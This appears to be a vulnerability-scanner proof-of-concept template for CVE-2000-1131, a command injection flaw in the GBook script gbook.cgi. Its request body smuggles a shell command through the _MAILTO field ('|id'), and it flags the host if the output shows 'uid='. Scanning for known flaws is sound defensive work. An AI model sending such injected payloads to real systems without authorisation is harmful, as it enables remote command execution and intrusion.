[info]
author = "ave"
description = "验证GBook留言本gbook.cgi存在命令注入漏洞，通过_MAILTO表单变量注入shell元字符实现远程命令执行"
id = "POC-AVE-2000-1099"
name = "CVE-2000-1131 PoC"
severity = "high"
tags = ["ave-2000-1099"]
vuln_id = [
    "CVE-2000-1131",
    "AVE-2000-1099",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/cgi-bin/gbook.cgi"
protocol = "http"

[poc.requests.body]
content = "_MAILTO=|id&submit=submit"
type = "raw"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["uid="]
